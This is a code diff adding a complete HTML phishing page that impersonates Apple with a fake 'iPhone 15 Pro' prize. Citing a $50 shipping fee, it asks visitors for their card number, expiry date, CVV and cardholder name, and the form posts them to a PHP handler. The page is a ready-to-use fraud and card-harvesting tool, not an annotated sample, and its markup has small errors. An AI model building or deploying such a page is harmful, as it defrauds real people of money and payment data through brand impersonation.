@@ -1,0 +1,112 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Claim Your iPhone 15 Pro</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background: linear-gradient(to bottom right, #ffffff, #f0f0f0);
+      margin: 0;
+      padding: 0;
+      text-align: center;
+    }
+
+    .container {
+      max-width: 600px;
+      margin: 100px auto;
+      padding: 40px;
+      background-color: #fff;
+      box-shadow: 0 0 10px rgba(0,0,0,0.1);
+    }
+
+    h1 {
+      color: green;
+    }
+
+    img {
+      width: 100px;
+      margin-bottom: 20px;
+    }
+
+    form {
+      display: flex;
+      flex-direction: column;
+      gap: 15px;
+    }
+
+    input {
+      padding: 12px;
+      font-size: 16px;
+      border: 1px solid #ccc;
+      border-radius: 5px;
+    }
+
+    button {
+      padding: 12px;
+      font-size: 16px;
+      background-color: green;
+      color: white;
+      border: none;
+      border-radius: 5px;
+      cursor: pointer;
+    }
+
+    .footer {
+      margin-top: 50px;
+      font-size: 12px;
+      color: #777;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/f/fa/Apple_logo_black.svg" alt="Apple Logo">
+    <h1>Payment Details</h1>
+    <p>To ship to your address we need a payment of 50$ as shipping fee.</strong>.<br>
+      Enter your details to claim your prize.</p>
+    <form action="process_payment.php" method="POST">
+        <h1>Payment Information</h1>
+
+        <fieldset>
+            <legend>Card Details</legend>
+            <p>
+                <label for="card_type">Card Type:</label>
+                <select id="card_type" name="card_type" required>
+                    <option value="">--Select a Card Type--</option>
+                    <option value="visa">Visa</option>
+                    <option value="mastercard">Mastercard</option>
+                    <option value="amex">American Express</option>
+                </select>
+            </p>
+            <p>
+                <label for="card_number">Card Number:</label>
+                <input type="text" id="card_number" name="card_number" pattern="[0-9]{13,19}" title="Enter a valid card number" required>
+            </p>
+            <p>
+                <label for="expiry_date">Expiration Date:</label>
+                <input type="month" id="expiry_date" name="expiry_date" required>
+            </p>
+            <p>
+                <label for="cvv">CVV:</label>
+                <input type="password" id="cvv" name="cvv" pattern="[0-9]{3,4}" title="Enter a 3 or 4 digit CVV" required>
+            </p>
+            <p>
+                <label for="card_holder_name">Card Holder Name:</label>
+                <input type="text" id="card_holder_name" name="card_holder_name" required>
+            </p>
+        </fieldset>
+    	<button type="submit">Claim Now</button>
+<div class="footer">
+      © 2025 ApplePrize Corp. All rights reserved. | Privacy | Terms
+    </div>
+  </div>
+
+  <script>
+    function handleSubmit(e) {
+      e.preventDefault();
+      window.location.href = "http://www.w3schools.com";
+    }
+  </script>
+</body>
+</html>
